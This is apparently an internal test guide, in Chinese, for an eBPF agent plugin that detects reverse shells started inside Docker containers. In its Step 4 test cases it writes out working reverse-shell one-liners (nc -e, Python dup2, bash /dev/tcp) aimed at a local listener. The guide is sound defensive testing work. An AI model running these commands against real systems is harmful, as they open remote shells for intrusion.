# 容器反弹 Shell 检测 — 测试指南

## 测试目标

验证 ebpf_base_detector 插件的容器反弹 Shell 检测功能（DataType 7003）：eBPF 在 `sched_process_exec` Hook 中捕获进程执行事件，通过 `mntns_id != root_mntns_id` 判断进程是否运行在容器内，用户态检查新进程的 FD 0（stdin）和 FD 1（stdout）是否指向 IPv4 Socket，任一指向 Socket 即触发容器反弹 Shell 告警。容器进程不再触发主机侧反弹 Shell 告警（DataType 6004）。本文档选取 3 种典型反弹 Shell 手法进行验证，覆盖 nc -e、Python dup2、bash /dev/tcp 三种方式。

### 与宿主机反弹 Shell 检测的区别

| 维度 | 宿主机反弹 Shell（6004） | 容器反弹 Shell（7003） |
|------|-------------------------|----------------------|
| 检测范围 | 仅非容器进程 | 仅容器内进程 |
| 检测规则 | stdin_socket / stdout_socket / no_tty_with_socket（3 条） | container_stdin_socket / container_stdout_socket（2 条） |
| 容器判断 | 无 | `mntns_id != root_mntns_id` |
| 告警字段 | 无容器信息 | 包含 `container_id`、`container_name`、`image_name` |
| 去重策略 | 容器进程不触发 | 容器进程专属 |

## 前置条件

| # | 检查项 | 检查命令 | 通过标准 |
|---|--------|---------|---------|
| 1 | 操作系统 | `uname -s` | 输出 `Linux` |
| 2 | 内核版本 | `uname -r` | 版本 >= 5.4 |
| 3 | BTF 支持 | `ls /sys/kernel/btf/vmlinux` | 文件存在 |
| 4 | root 权限 | `whoami` | 输出 `root` |
| 5 | 编译环境 | `go version` | Go 已安装 |
| 6 | Docker | `docker version` | Docker 已安装且运行中 |
| 7 | nc 工具（宿主机） | `nc -h 2>&1 \| head -1` | nc 已安装 |

如果任一条件不满足，测试无法进行。

---

## Step 1：编译部署

```bash
cd /home/work/goProject/src/company/agent
make build
make deploy
```

**验证**：

```bash
ls -la /opt/cloudsec/bin/agent /opt/cloudsec/plugins/ebpf_base_detector/ebpf_base_detector
```

两个文件都存在即成功。

---

## Step 2：启动 Agent

打开 **Terminal A**，执行：

```bash
cd /opt/cloudsec
rm -f /tmp/ebpf_test.log
sudo ./bin/agent -standalone -plugins=ebpf_base_detector -output=/tmp/ebpf_test.log -test
```

### 启动成功判定

在 Terminal A 的 stderr 输出中，**必须**看到以下日志行：

```
INFO  eBPF program loaded successfully
```

同时在插件日志中应看到：

```bash
grep "Container reverse shell detector initialized" /opt/cloudsec/logs/plugins/ebpf_base_detector/ebpf_base_detector.log
```

预期输出：

```
INFO  Container reverse shell detector initialized
```

**判定规则**：
- 两行日志都出现 → 启动成功，进入 Step 3
- `failed to load eBPF` 错误 → 内核不支持，检查前置条件 2、3

### 日志位置

| 位置 | 内容 | 说明 |
|------|------|------|
| Terminal A (stderr) | Agent 主进程日志 | 用于确认启动状态 |
| `/opt/cloudsec/logs/plugins/ebpf_base_detector/ebpf_base_detector.log` | 插件日志，包含 `Container reverse shell detected` | **推荐用此日志验证**，包含 `container_id` |
| `/tmp/ebpf_test.log` | 检测结果 JSON 输出 | **主要验证位置** |

### 搜索技巧

```bash
# 搜索容器反弹 Shell 告警（按 data_type 过滤）
grep '"data_type":7003' /tmp/ebpf_test.log

# 按规则名搜索
grep 'container_stdin_socket\|container_stdout_socket' /tmp/ebpf_test.log

# 按远程端口搜索
grep '"remote_port":"9001"' /tmp/ebpf_test.log

# 使用 jq 格式化输出（需安装 jq）
cat /tmp/ebpf_test.log | jq 'select(.data_type==7003)'

# 实时监控插件日志中的容器反弹 Shell 告警
tail -f /opt/cloudsec/logs/plugins/ebpf_base_detector/ebpf_base_detector.log | grep "Container reverse shell detected"

# 实时监控新告警
tail -f /tmp/ebpf_test.log
```

---

## Step 3：确认 Docker 网络并启动测试容器

### 确认 Docker 桥接网关 IP

在宿主机上执行：

```bash
docker network inspect bridge | grep Gateway
```

预期输出类似：

```
"Gateway": "172.17.0.1"
```

记下此 IP（后续测试中用 `GATEWAY_IP` 表示，通常为 `172.17.0.1`）。

### 启动测试容器

打开 **Terminal C**，启动一个 Docker 容器并安装测试所需工具：

```bash
docker run -it --rm --name rs_container_test ubuntu:22.04 /bin/bash
```

容器启动后，安装测试所需命令：

```bash
apt-get update && apt-get install -y netcat-traditional python3 2>/dev/null; true
```

> 说明：`ubuntu:22.04` 基础��像未预装 `nc.traditional` 和 `python3`，需手动安装。`bash` 已内置。如无该镜像，可先 `docker pull ubuntu:22.04`。

---

## Step 4：执行测试用例

每个测试需要 3 个终端：**Terminal A**（Agent，已在 Step 2 启动）、**Terminal B**（宿主机监听端）、**Terminal C**（容器内触发端）。每执行一条后，检查 `/tmp/ebpf_test.log` 是否出现对应告警。

> **注意**：每个测试用例使用不同端口，避免端口冲突。测试完一个后在 Terminal B 按 Ctrl+C 关闭监听再进行下一个。

### 告警日志格式

每条告警在 `/tmp/ebpf_test.log` 中以一行 JSON 输出：

```json
{"timestamp":1234567890,"data_type":7003,"pid":"PID","tgid":"TGID","ppid":"PPID","uid":"UID","comm":"进程名","exe_path":"路径","fd_type":"类型","stdin_path":"stdin路径","stdout_path":"stdout路径","remote_ip":"IP","remote_port":"端口","rule_name":"规则名","confidence":"置信度","description":"描述","container_id":"容器ID","container_id_short":"短ID","container_name":"容器名"}
```

**fd_type 含义**：

| 值 | 含义 |
|----|------|
| 1 | 仅 stdin (FD 0) 指向 socket |
| 2 | 仅 stdout (FD 1) 指向 socket |
| 3 | stdin + stdout 都指向 socket |

### 通用判定规则

**PASS** 条件（全部满足）：
1. `/tmp/ebpf_test.log` 中出现 `"data_type":7003` 的 JSON 行
2. `"comm"` 与预期进程名一致
3. `"fd_type"` 值与预期一致
4. `"remote_ip"` 和 `"remote_port"` 与测试使用的监听地址一致
5. `"container_id"` 非空（64 位十六进制字符串）

**FAIL** 条件（任一满足）：
- 执行命令后 5 秒内 `/tmp/ebpf_test.log` 无任何 `"data_type":7003` 的记录
- `"fd_type"`、`"remote_ip"` 或 `"remote_port"` 与预期不一致
- `"container_id"` 为空
- 出现了 `"data_type":6004` 而非 7003（说明容器/主机分流未生效）

---

### 用例 1：CRS001 — 容器内 nc -e 反弹 Shell

**检测原理**：容器内 nc 建立 TCP 连接后 fork+exec `/bin/bash`，子进程的 stdin/stdout 继承 socket FD。

**测试命令**：

Terminal B（宿主机监听端）：

```bash
nc -lvp 9001
```

Terminal C（容器内触发端）：

```bash
nc.traditional -e /bin/bash 172.17.0.1 9001
```

> 注意：`172.17.0.1` 是 Docker 桥接网关 IP（即宿主机在 docker0 网桥上的地址），请根据 Step 3 中实际查询结果替换。

**预期日志**（`/tmp/ebpf_test.log`）：

```json
{"timestamp":...,"data_type":7003,"comm":"bash","exe_path":"/usr/bin/bash","fd_type":"3","remote_ip":"172.17.0.1","remote_port":"9001","rule_name":"container_stdin_socket","confidence":"high","container_id":"...","container_id_short":"..."}
```

**验证命令**：

```bash
grep '"data_type":7003' /tmp/ebpf_test.log | grep '"remote_port":"9001"'
```

**PASS 判定**：上述命令有输出，且 JSON 中 `"comm":"bash"`，`"fd_type":"3"`，`"remote_port":"9001"`，`"container_id"` 非空。

> 说明：`fd_type=3` 表示 stdin(1) + stdout(2) = 3，两者都指向 socket。测试完成后在 Terminal B 输入 `exit` 关闭反弹 Shell，Ctrl+C 关闭监听。

---

### 用例 2：CRS002 — 容器内 Python dup2 反弹 Shell

**检测原理**：Python 创建 socket 连接后，用 `os.dup2()` 将 FD 0/1/2 全部指向 socket，然后 `subprocess.call` 内部调用 `execve("/bin/bash")`。新 bash 进程的 stdin/stdout 直接是 socket。

**测试命令**：

Terminal B（宿主机监听端）：

```bash
nc -lvp 9002
```

Terminal C（容器内触发端）：

```bash
python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.17.0.1",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

> 注意：将 `172.17.0.1` 替换为 Step 3 中查询到的实际网关 IP。

**预期日志**（`/tmp/ebpf_test.log`）：

```json
{"timestamp":...,"data_type":7003,"comm":"bash","exe_path":"/usr/bin/bash","fd_type":"3","remote_ip":"172.17.0.1","remote_port":"9002","rule_name":"container_stdin_socket","confidence":"high","container_id":"..."}
```

**验证命令**：

```bash
grep '"data_type":7003' /tmp/ebpf_test.log | grep '"remote_port":"9002"'
```

**PASS 判定**：上述命令有输出，且 JSON 中 `"comm":"bash"`，`"fd_type":"3"`，`"remote_port":"9002"`，`"container_id"` 非空。

> 说明：测试完成后在 Terminal B 输入 `exit` 关闭反弹 Shell，Ctrl+C 关闭监听。

---

### 用例 3：CRS003 — 容器内 bash /dev/tcp 反弹 Shell

**检测原理**：外层 bash 通过内建的 `/dev/tcp` 虚拟文件创建 socket，`>&` 将 stdout/stderr 重定向到 socket，`0>&1` 将 stdin 重定向到 socket，然后 exec 内层 `bash -i`。

**测试命令**：

Terminal B（宿主机监听端）：

```bash
nc -lvp 9003
```

Terminal C（容器内触发端）：

```bash
bash -c 'bash -i >& /dev/tcp/172.17.0.1/9003 0>&1'
```

> 注意：将 `172.17.0.1` 替换为 Step 3 中查询到的实际网关 IP。必须使用 bash 而非 dash/sh，`/dev/tcp` 是 bash 内建功能。

**预期日志**（`/tmp/ebpf_test.log`）：

```json
{"timestamp":...,"data_type":7003,"comm":"bash","exe_path":"/usr/bin/bash","fd_type":"3","remote_ip":"172.17.0.1","remote_port":"9003","rule_name":"container_stdin_socket","confidence":"high","container_id":"..."}
```

**验证命令**：

```bash
grep '"data_type":7003' /tmp/ebpf_test.log | grep '"remote_port":"9003"'
```

**PASS 判定**：上述命令有输出，且 JSON 中 `"comm":"bash"`，`"fd_type":"3"`，`"remote_port":"9003"`，`"container_id"` 非空。

> 说明：测试完成后在 Terminal B 输入 `exit` 关闭反弹 Shell，Ctrl+C 关闭监听。

---

### 用例 4（反向验证）：宿主机反弹 Shell 触发 6004 而非 7003

退出容器，在宿主机上执行反弹 Shell 测试：

Terminal B（宿主机监听端）：

```bash
nc -lvp 9004
```

Terminal C（宿主机触发端）：

```bash
nc.traditional -e /bin/bash 127.0.0.1 9004
```

**预期**：
- `/tmp/ebpf_test.log` 中出现 `"data_type":6004` 的告警（主机侧反弹 Shell）
- **不应**出现 `"data_type":7003` 的告警

**验证命令**：

```bash
# 应有输出（主机侧 6004 告警）
grep '"data_type":6004' /tmp/ebpf_test.log | grep '"remote_port":"9004"'

# 不应有输出（容器侧 7003 告警）
grep '"data_type":7003' /tmp/ebpf_test.log | grep '"remote_port":"9004"'
```

**PASS 判定**：第一条命令有输出，第二条命令无输出。

---

## Step 5：记录测试结果

| # | 用例 ID | 测试手法 | 执行环境 | 监听端口 | 预期 fd_type | 预期 data_type | 实际 | PASS/FAIL |
|---|---------|----------|----------|----------|-------------|---------------|------|-----------|
| 1 | CRS001 | nc -e 反弹 | 容器内 | 9001 | 3 | 7003 | | |
| 2 | CRS002 | Python dup2 反弹 | 容器内 | 9002 | 3 | 7003 | | |
| 3 | CRS003 | bash /dev/tcp 反弹 | 容器内 | 9003 | 3 | 7003 | | |
| 4 | CRS004 | 反向验证（宿主机 nc -e） | 宿主机 | 9004 | 3 | 6004 | | |

---

## Step 6：清理与停止

```bash
# 1. Terminal C（容器内）：退出容器
exit

# 2. Terminal B：Ctrl+C 关闭 nc 监听

# 3. Terminal A：按 Ctrl+C 停止 Agent

# 4. 确认容器已清理（--rm 参数已自动清理）
docker ps -a | grep rs_container_test

# 5. 清理输出文件（可选）
rm -f /tmp/ebpf_test.log
```

---

## 常见问题排查

| 问题现象 | 可能原因 | 排查步骤 |
|---------|---------|---------|
| Agent 启动报 `failed to load eBPF` | 内核不支持或无 root 权限 | 1) `whoami` 确认 root；2) `uname -r` 确认 >= 5.4；3) `ls /sys/kernel/btf/vmlinux` 确认 BTF |
| `/tmp/ebpf_test.log` 未生成 | Agent 未成功启动或路径无写权限 | 确认 Terminal A 中出现 `detection results will be written to: /tmp/ebpf_test.log` |
| 容器内 nc 连不上宿主机 9001 端口 | 网关 IP 不正确或宿主机防火墙 | 1) `docker network inspect bridge \| grep Gateway` 确认网关 IP；2) 在容器内 `ping 172.17.0.1` 测试连通性；3) 检查宿主机 iptables 规则 |
| 容器内 `nc.traditional` 不存在 | 未安装 netcat-traditional | 容器内执行 `apt-get update && apt-get install -y netcat-traditional` |
| 容器内 `python3` 不存在 | 未安装 python3 | 容器内执行 `apt-get install -y python3` |
| bash /dev/tcp 报错 `No such file` | 使用了 dash/sh 而非 bash | 确认使用 bash：`bash -c 'echo $BASH_VERSION'`；确保触发命令以 `bash -c` 开头 |
| 出现 6004 而非 7003 告警 | 容器/主机分流未生效 | 检查插件日志中容器进程的 `mntns_id` 和 `root_mntns_id` 是否不相等；如果相等说明 mntns 初始化有误 |
| 7003 告警中 `container_id` 为空 | cgroup 格式不匹配 | 在容器内查看 `cat /proc/1/cgroup`，确认输出中包含 Docker 容器 ID |
| 宿主机反弹 Shell 也触发了 7003 | mntns_id 判断异常 | 检查插件日志中宿主机进程的 `mntns_id` 和 `root_mntns_id` 是否相等 |
| `remote_ip` 显示 0.0.0.0 | socket 未成功连接 | 确认 Terminal B 监听端是否在触发命令之前启动 |
| 告警延迟超过 5 秒 | standalone 刷新间隔 | eBPF 事件本身无延迟，延迟来自用户态轮询；检查 `flush_interval` 配置 |
| Docker 不可用 | Docker 服务未启动 | `systemctl status docker`，确认服务运行中 |
